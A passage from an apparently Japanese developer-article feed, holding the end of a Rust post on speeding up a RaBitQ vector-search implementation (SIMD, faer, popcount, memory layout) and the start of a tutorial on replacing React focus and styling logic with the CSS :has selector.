    <span class="token keyword">let</span> <span class="token keyword">mut</span> max <span class="token operator">=</span> <span class="token keyword">f32</span><span class="token punctuation">::</span><span class="token constant">MIN</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> v <span class="token keyword">in</span> vec<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token operator">*</span>v <span class="token operator">&lt;</span> min <span class="token punctuation">{</span>
            min <span class="token operator">=</span> <span class="token operator">*</span>v<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token operator">*</span>v <span class="token operator">></span> max <span class="token punctuation">{</span>
            max <span class="token operator">=</span> <span class="token operator">*</span>v<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token punctuation">(</span>min<span class="token punctuation">,</span> max<span class="token punctuation">)</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>以前は便利なので<code class="language-text">f32::min()</code>と<code class="language-text">f32::max()</code>を使用していましたが、昇順／降順以外のベクトルについては<code class="language-text">if</code>の方がパフォーマンスが優れています。</p>
<p>次のようにメソッドチェーンでベクトルに対して処理を数回繰り返し実行し、複数のイテレーションでの集計によりスカラー量子化を計算する代わりに、</p>
<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust"><span class="token keyword">let</span> y_scaled <span class="token operator">=</span> residual<span class="token punctuation">.</span><span class="token function">add_scalar</span><span class="token punctuation">(</span><span class="token operator">-</span>lower_bound<span class="token punctuation">)</span> <span class="token operator">*</span> one_over_delta <span class="token operator">+</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>rand_bias<span class="token punctuation">;</span>
<span class="token keyword">let</span> y_quantized <span class="token operator">=</span> y_scaled<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>v<span class="token closure-punctuation punctuation">|</span></span> v<span class="token punctuation">.</span><span class="token function">to_u8</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"convert to u8 error"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> scalar_sum <span class="token operator">=</span> y_quantized<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fold</span><span class="token punctuation">(</span><span class="token number">0u32</span><span class="token punctuation">,</span> <span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>acc<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v<span class="token closure-punctuation punctuation">|</span></span> acc <span class="token operator">+</span> v <span class="token keyword">as</span> <span class="token keyword">u32</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>1回のループでこれを実行できます。</p>
<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust"><span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> sum <span class="token operator">=</span> <span class="token number">0u32</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>vec<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> q <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> lower_bound<span class="token punctuation">)</span> <span class="token operator">*</span> multiplier <span class="token operator">+</span> bias<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">u8</span><span class="token punctuation">;</span>
        quantized<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> q<span class="token punctuation">;</span>
        sum <span class="token operator">+=</span> q <span class="token keyword">as</span> <span class="token keyword">u32</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    sum
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>スカラー量子化については、<code class="language-text">f32</code>を<code class="language-text">u8</code>に変換できることは分かっているため、<code class="language-text">to_u8().unwrap()</code>の代わりに<code class="language-text">as u8</code>を使用できます。
<a href="https://github.com/kemingy/rabitq/commit/af39c1ce47eb8ea32e11f47b99548e77846397ea">コミットaf39c1c</a>および<a href="https://github.com/kemingy/rabitq/commit/d2d51b0785f0234df4d83a60eea96a36486a1120">コミットd2d51b0</a>は、GistのQPSを<strong>31</strong>%改善しました。
以下の部分もSIMDで書き換えることができ、これによりGistのQPSが12%改善します。</p>
<ul>
<li>最小／最大：<a href="https://github.com/kemingy/rabitq/commit/c97be68c13c7b4498b564afe3de2a1f6d8bca5ce">コミットc97be68</a>および<a href="https://github.com/kemingy/rabitq/commit/e5a4af05433bf724da6902d34a745b4b2bdefd8d">コミットe5a4af0</a></li>
<li>スカラー量子化：<a href="https://github.com/kemingy/rabitq/commit/28efe097a46696bb1a5469db22e500bafdc04514">コミット28efe09</a></li>
</ul>
<p>tr_mulをベクトル射影であるSIMDに置き換えることも試してみました。ここでは、<code class="language-text">nalgebra</code>がBLASを使用することが判明したため、パフォーマンスは変わりません。</p>
<h3>新たな代数クレート：faer</h3>
<p><code class="language-text">f32::clone()</code>の問題について調べている際に、<a href="https://github.com/sarah-quinones/faer-rs">faer</a>という新たなRust代数クレートを見つけました。多数のSIMDにより最適化されており、行と列のイテレーションパフォーマンスを向上させます。QR分解もnalgebraよりかなり高速です。こちらの<a href="https://github.com/kemingy/rabitq/commit/04118219d28bd0d43594c98c71e752faa81ff79d">コミット0411821</a>はトレーニング部分を高速化します。</p>
<p>また、<a href="https://github.com/kemingy/rabitq/commit/0d969bdcfb331f87e938e043e01acc648e1cf963">コミット0d969bd</a>以降は<code class="language-text">ColRef</code>や<code class="language-text">RowRef</code>ラッパーなしでこれらのベクトルを通常のスライスとして使用できます。</p>
<p>最初からfaerを使っていれば、多くのトラブルを回避できていたでしょう。いずれにせよ、この経験から多くを学びました。</p>
<h3>バイナリ内積</h3>
<p>バイナリ内積についてはpopcntがすでに解決済みと思っていましたが、<a href="https://share.firefox.dev/3Yk3Ok8">FlameGraph</a>によると、<code class="language-text">count_ones()</code>の呼び出しが<code class="language-text">binary_dot_product</code>の実行時間に占める割合は7%にすぎないようです。AVX512には<code class="language-text">vpopcntq</code>命令がありますが、AVX2シミュレーションの方が一般的なので、筆者はこちらを使用しています。</p>
<p><a href="https://github.com/komrad36/popcount/blob/master/popcnt.h">こちら</a>はAVX2を用いたpopcnt実装の良い参考になります。<a href="https://github.com/kemingy/rabitq/commit/edabd4a64c5b8ea2637b5332105638edf16afa7c">コミットedabd4a</a>はこれをRustで再実装したもので、GistのQPSを<strong>11</strong>%改善します。この裏技は、ベクトルに256以上の項目がある場合しかうまくいきません。つまり、バイナリ表現に256ビット必要ということです。</p>
<h3>インライン</h3>
<p><a href="https://doc.rust-lang.org/reference/attributes/codegen.html#the-inline-attribute">#[inline]</a>属性は慎重に使う必要があります。この属性をすべてのSIMD関数に追加することで、GistのQPSが<strong>5</strong>%改善します。</p>
<h3>IO</h3>
<p>ここで少し背景情報を追加する必要があります。</p>
<p>現行の実装は、<a href="https://en.wikipedia.org/wiki/K-means_clustering">k平均法</a>を用いてベクトルのクラスタリングを行い、セントロイドをメモリに格納するIVFアルゴリズムがベースになっています。クエリベクトルは、<code class="language-text">l2_squared_distance(query, centroid)</code>がより小さいクラスタとしか比較されません。</p>
<p>探索する最近傍クラスタの数を制御する<code class="language-text">n_probe</code>というパラメータがあります。<code class="language-text">n_probe</code>の値が大きいと再現率は上がりますが、QPSは下がります。</p>
<p>RaBitQは、バイナリ内積を使用しておおよその距離を推定します。しきい値よりも小さい場合は元のL2二乗距離と同じランキングにリランキングし、それとともにしきい値を更新します。</p>
<p>筆者は以前、n最近傍を選択するだけで並べ替えを行わない<code class="language-text">slice::select_nth_unstable</code>を使用していました。クエリから遠いクラスタを探索するとリランキング率が上がり、L2二乗距離の計算が増えます。選択したn番目のクラスタを並べ替えることで、GistのQPSが<strong>4</strong>%改善しました。</p>
<p>別の裏技として、各クラスタのベクトルをセントロイドまでの距離順に並び替える方法もあります。<a href="https://github.com/kemingy/rabitq/commit/ea13ebca46257d7c2e22250fe02a481e7681f0a9">こちらのコミットea13ebc</a>も、GistのQPSを<strong>4</strong>%改善しました。</p>
<p>各ベクトルのおおよその距離の推定に使用するメタデータがいくつかあります。</p>
<ul>
<li>factor_ip: f32</li>
<li>factor_ppc: f32</li>
<li>error: f32</li>
<li>x_c_distance_square: f32</li>
</ul>
<p>以前、筆者は4つの<code class="language-text">Vec&lt;f32></code>を使用してこれらのメタデータを格納していましたが、計算を行う際にはそれぞれに<code class="language-text">vector[i]</code>が必要なため、IOには適していませんでした。<a href="https://github.com/kemingy/rabitq/commit/bb440e3e8b150f590523eaa77e7c62165a5ee764">コミットbb440e3</a>でこれらを一つのstructに組み合わせることで、GistのQPSが<strong>2.5</strong>%改善しました。これは4xf32であるためうまく行き、そのためC表現を直接使用することができます。</p>
<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust"><span class="token attribute attr-name">#[derive(Debug, Clone, Copy, Default, Serialize, Deserialize)]</span>
<span class="token attribute attr-name">#[repr(C)]</span>
<span class="token keyword">struct</span> <span class="token type-definition class-name">Factor</span> <span class="token punctuation">{</span>
    factor_ip<span class="token punctuation">:</span> <span class="token keyword">f32</span><span class="token punctuation">,</span>
    factor_ppc<span class="token punctuation">:</span> <span class="token keyword">f32</span><span class="token punctuation">,</span>
    error_bound<span class="token punctuation">:</span> <span class="token keyword">f32</span><span class="token punctuation">,</span>
    center_distance_square<span class="token punctuation">:</span> <span class="token keyword">f32</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>残念ながら、<code class="language-text">faer</code>はu64ベクトルに対応していません。したがって、ベクトルのバイナリ表現を<code class="language-text">Vec&lt;Vec&lt;u64>></code>に格納する必要があります。<a href="https://github.com/kemingy/rabitq/commit/48236b23069db92bdb741fc6693e126b52c397ce">コミット48236b2</a>でこれを<code class="language-text">Vec&lt;u64></code>に変更することで、GistのQPSが<strong>2</strong>%改善しました。</p>
<h3>const generics</h3>
<p>C++版は、テンプレートを使用して異なる項目のコードを生成します。この機能はRustにもありますが、異なる項目用のコードの再コンパイルは、少数の固定された項目しかない会社の中など、特定のユースケースでしか行えない可能性があるため、筆者は試してみませんでした。公開ライブラリでは、ユーザーが自ら再コンパイルする必要がないよう、一般解を提供する方が良いでしょう。</p>
<h3>その他のツール</h3>
<p><a href="https://github.com/Shnatsel/bounds-check-cookbook/">bounds-check-cookbook</a>では、safe Rustで境界チェックを無くす方法の例をいくつか紹介しています。</p>
<p>筆者は<a href="https://doc.rust-lang.org/rustc/profile-guided-optimization.html">PGO</a>と<a href="https://github.com/llvm/llvm-project/tree/main/bolt">BOLT</a>を試してみましたが、改善は得られませんでした。</p>
<p><a href="https://github.com/tikv/jemallocator">jemalloc</a>や<a href="https://github.com/microsoft/mimalloc">mimalloc</a>に変えてもパフォーマンスは改善しません。</p>
<h2>まとめ</h2>
<ul>
<li>SIMDは適切に使用すれば素晴らしい</li>
<li>特に大きなデータセットではIOも重要</li>
</ul>
<p>データセットGistを使用したパフォーマンスは、現時点ではC++版と同じです。筆者はSIMDをより頻繁に使用しますが、C++版はconst genericsを使用しています。</p>
<h2>参考文献</h2>
<ul>
<li><a href="https://en.algorithmica.org/hpc/algorithms/matmul/">Algorithmica / HPC</a></li>
</ul>
<p><img src="https://i.creativecommons.org/l/by-nc-sa/4.0/80x15.png" style="width: initial"> <br>
この著作物のライセンスは、<a href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>に基づいて付与されています。</p>]]></content:encoded></item><item><title><![CDATA[ReactコードをCSSの:hasセレクタで置き換える]]></title><description><![CDATA[CSSの新しい:hasセレクタと、これを使用したReactコードの改善方法について説明します。実用的で美しい例とともに。  大昔、とは言ってもCSSが出てきた当初の話ですが、CSSはカスケードする仕…]]></description><link>https://postd.cc/replacing-react-with-css/</link><guid isPermaLink="false">https://postd.cc/replacing-react-with-css/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[React]]></category><category><![CDATA[CSS]]></category><pubDate>Sat, 19 Oct 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>CSSの新しい:hasセレクタと、これを使用したReactコードの改善方法について説明します。実用的で美しい例とともに。</p>
<p><img src="https://www.developerway.com/_next/image?url=%2Fassets%2Freplacing-react-with-css%2Fwelcome.png&#x26;w=1080&#x26;q=75"></p>
<p>大昔、とは言ってもCSSが出てきた当初の話ですが、CSSはカスケードする仕組みになっていると教えられていました。それは、Cascading Style Sheetsという名前からも分かります。CSSでは、入れ子のように要素の中の要素を指定し、さらにその中に含まれる要素を指定していくことができます。しかし、その逆はできません。したがって、子要素が親要素にスタイルを適用するには、JavaScriptを使うしかありませんでした。</p>
<p>今までは。</p>
<p><a href="https://caniuse.com/css-has">すべての主要ブラウザ</a>がCSSの<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:has">:hasセレクタ</a>に対応したことで、親要素を指定できるようになりました。それだけではありません。これは世界が一変したと言えるほどの出来事です。筆者のように、要素の角を丸くするために透過GIFを使用していた時代からウェブ開発を行っている読者の方は、これによって広がる可能性に圧倒されるでしょう。</p>
<p>これを使ってぜひ色々と遊んでみていただきたいと思いますが、Reactの世界では実際にどのような実用的用途があるのでしょうか。ここでは特に注目すべき用途を3つ紹介したいと思います。</p>
<h2>:hasセレクタとは？</h2>
<p>従来のCSSでは、以下のようなことができます。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">.content .card</span> <span class="token punctuation">{</span>
  <span class="token property">background</span><span class="token punctuation">:</span> #f0f0f0<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.content img</span> <span class="token punctuation">{</span>
  <span class="token property">margin</span><span class="token punctuation">:</span> 1rem 0<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>これにより、<code class="language-text">.content</code>要素に含まれる<code class="language-text">.card</code>要素の背景が薄いグレーに変わり、中の画像に余白が追加されます。そうすることで、画像とテキストが視覚的に区別されます。</p>
<p>また、隣の兄弟を<code class="language-text">+</code>または<code class="language-text">~</code>結合子で指定することができます。例えば、上記の画像が<code class="language-text">.card</code>要素のすぐ後にくる場合、より見やすくするために余白をさらに追加するとよいでしょう。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">// images that immediately follow a card element
// will have bigger margins than other images
.content .card + img</span> <span class="token punctuation">{</span>
  <span class="token property">margin</span><span class="token punctuation">:</span> 2rem 0<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><a href="https://codesandbox.io/p/sandbox/xf6gsw?file=%2Fsrc%2Findex.tsx%3A6%2C30">コード例はこちらをご覧ください。</a></p>
<p>しかし、最近まで「逆」方向に要素を指定することができませんでした。例えば、すぐ後に画像が続く<code class="language-text">.card</code>要素の背景を変えたい場合、JavaScriptを使うしか方法がありませんでした。同様に、中に画像が含まれる場合に<code class="language-text">.card</code>要素のスタイルを変えることもできませんでした。</p>
<p>新しい<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:has">CSSセレクタ</a><code class="language-text">:has</code>は、この問題を解決します。</p>
<p>例えば、中に画像が含まれる<code class="language-text">.card</code>要素にはピンク色の枠を使用し、それ以外の<code class="language-text">.card</code>要素にはグレーの枠を使用するといったことも簡単にできます。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">// all the cards will have grey top borders
.card</span> <span class="token punctuation">{</span>
  <span class="token property">border-top</span><span class="token punctuation">:</span> 10px solid #f6f7f6<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">// cards with images inside will have pink borders
.card:has(img)</span> <span class="token punctuation">{</span>
  <span class="token property">border-top</span><span class="token punctuation">:</span> 10px solid #fee6ec<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">:has</code>セレクタを他のセレクタと組み合わせて使用することもできます。すぐ後に画像が続くカードには青い枠を付けてみましょう。その場合は<code class="language-text">+</code>結合子で条件を追加します。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">// if a card has an image as a next element - give it a blue border
.card:has(+ img)</span> <span class="token punctuation">{</span>
  <span class="token property">border-top</span><span class="token punctuation">:</span> 10px solid #c4f4ff<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>もっと複雑なコードを書くこともできます。h3タグを含まず、<code class="language-text">img</code>タグを含み、別の<code class="language-text">.card</code>要素がすぐ後に続き、それより後に<code class="language-text">img</code>タグがある<code class="language-text">.card</code>要素の背景を、複数の画像を含むカードが後に続く場合に限り緑色にしてみましょう。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css">// have fun reading that <span class="token selector">;)
.card:not(:has(h3)):has(img):has(+ .card):has(~ img):has(~ .card):has(> img:nth-child(1))</span> <span class="token punctuation">{</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> #c3dcd0<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>以下が実装例になります。</p>
<iframe src="https://codesandbox.io/embed/tmh8wk?codemirror=1&amp;hidedevtools=0&amp;view=preview" style="width:100%;height:500px;border:0;border-radius:4px" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
<p>しかし、Reactアプリでこのようなことがしたいでしょうか。こうしたスタイルは、子セレクタと同様に要素の境界が曖昧になりがちです。ここ10年くらい、そうならないようにするための方法を色々と工夫して編み出してきたのではなかったでしょうか。BEM、SASS、CSS-in-JS、CSSモジュールなどなど。スタイルの適用範囲を意図した要素にのみ限定するために、私たちはあらゆる手段を講じます。</p>
<p>では、突如その流れに逆行し、あらゆるベストプラクティスと逆のことをする理由はどこにあるのでしょうか。もちろん、Reactでは数年置きにそうした傾向が見られるのはありますが😅</p>
<p>答えは、複雑なReactコードを不要にするためです。最高のReactコードは、Reactコードを一切使わないことである場合もあるのです。先ほどは極めて複雑なセレクタの例をお見せしましたが（まね 真似することはお勧めしません）、ReactをCSSに置き換えることでロジックを単純化することができ、若干パフォーマンスを改善できる場合もあります。</p>
<p>ではいくつか実例を見てみましょう。</p>
<h2>:hasセレクタと要素のフォーカス状態</h2>
<p>タスクボードを実装したいとします。ボード上には多数のカードがあり、各カードにはそれぞれ「開く」と「削除」の2つのボタンがあります。「開く」ボタンをクリックすると、カードの内容がすべてモーダル上に開きます。「削除」をクリックするとカードが削除されます。</p>
<p><img src="https://www.developerway.com/assets/replacing-react-with-css/example1-cards.png"></p>
<p>このカードのコードは非常にシンプルです。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
  Some text here
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>buttons<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Open</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Delete</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Tabキーを使ってボタンに移動するなど、キーボードで操作可能にしたいと思います。さらに、キーボードユーザーの利便性を改善するため、どのボタンが選択されているかが分かるようにしたいと思います。ユーザーがTabキーを使っていずれかのボタンに移動したら、カードが少し「飛び出す」ようにし、同じ列の他のカードはグレーアウトさせます。さらに、アクティブ状態のカードの枠の色を変え、現在アクティブな操作が分かるようにしたいと思います。「削除」ボタンには赤、「開く」ボタンには緑を使用します。</p>
<p><img src="https://www.developerway.com/assets/replacing-react-with-css/example1-5-cards-highlighted.png"></p>
<p>Reactでこの機能を実装するには、focusイベントリスナーを追加し、現在アクティブなボタンを検知し、カード自体のclassNamesを変更できるようstateを維持し、他のカードも変更できるようそのstateをどうにかして親と共有する必要があります。そのためには、Contextなどの状態管理ソリューションを導入する必要があるでしょう。気が付けば、すべてのタブのすべてのカードを再レンダリングする本格的なフォーカスマネージャーを実装しなくてはならなくなっているでしょう。実際にこのような凝ったインタラクションを見かけないのも無理はありません。せいぜいボタンの輪郭線に一貫性をもたせることぐらいしか望めないでしょう。</p>
<p>しかし、<code class="language-text">:has</code>セレクタを使えば今述べたようなことも比較的簡単に実装できます。</p>
<p>ステップ1。<code class="language-text">className</code>に頼らなくても<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors">選択できる</a>よう、<code class="language-text">data-</code>属性をボタンに割り当てます。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// add data-action attributes to the buttons</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">data-action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>open<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Open</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">data-action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>delete<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Delete</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ステップ2。フォーカスされた「削除」ボタンを含むカードを見つけ、CSSを変えます。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">// make the card "pop" and change its border colors
// if the "delete" button inside the card is focused
.card:has([data-action='delete']:focus-visible)</span> <span class="token punctuation">{</span>
  <span class="token property">border-top</span><span class="token punctuation">:</span> 10px solid #f7bccb<span class="token punctuation">;</span>
  <span class="token property">box-shadow</span><span class="token punctuation">:</span> 0 0 0 2px #f7bccb<span class="token punctuation">;</span>
  <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scale</span><span class="token punctuation">(</span>1.02<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ステップ3。フォーカスされた「開く」ボタンを含むカードを見つけ、CSSを変えます。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">// make the card "pop" and change its border colors
// if the "open" button inside the card is focused
.card:has([data-action='open']:focus-visible)</span> <span class="token punctuation">{</span>
  <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scale</span><span class="token punctuation">(</span>1.02<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">border-top</span><span class="token punctuation">:</span> 10px solid #c3dccf<span class="token punctuation">;</span>
  <span class="token property">box-shadow</span><span class="token punctuation">:</span> 0 0 0 2px #c3dccf<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ステップ4。これが一番難しい処理になります。フォーカスされた「開く」または「削除」ボタンを含むカードの「前後」のカードをすべて見つけ、グレーアウトする必要があります。魔法の種明かしはこちらです。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">// all cards after the card with focused "open" button
.card:has([data-action='open']:focus-visible) ~ .card,

// all cards after the card with focused "delete" button
.card:has([data-action='delete']:focus-visible) ~ .card,

// all cards before the card with focused "open" button
.card:has(~ .card [data-action='open']:focus-visible),

// all cards before the card with focused "delete" button
.card:has(~ .card [data-action='delete']:focus-visible)</span> <span class="token punctuation">{</span>
  <span class="token property">filter</span><span class="token punctuation">:</span> <span class="token function">greyscale</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> #f6f7f6<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>JavaScriptもReactの再レンダリングも一切必要としない、どのボードよりも美しいキーボード操作を実現できました。以下の実例を触ってみてください。</p>
<p>in all the boards ever with zero JavaScript and zero React re-renders! A live example is below to play around with.</p></p>
<iframe src="https://codesandbox.io/embed/rdqj6x?codemirror=1&amp;hidedevtools=0&amp;view=preview" style="width:100%;height:500px;border:0;border-radius:4px" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
<p>:hasセレクタとカテゴリ分け</p>
<p>もう一つ、<code class="language-text">:has</code>セレクタのユースケースとして筆者がシンプルで秀逸だと思うのが、データに基づいて要素を色分けできる点です。</p>
<p>例えば、ショップで販売している商品を記載した表を実装してみましょう。これらの商品は、特定のカテゴリに分類されます。オンラインショップで事務用品、衣類、馬を販売しているとしましょう。表にはいくつかの列があり、最もシンプルな形にまとめたものが以下になります。</p>
<p><img src="https://www.developerway.com/assets/replacing-react-with-css/example2-table.png"></p>
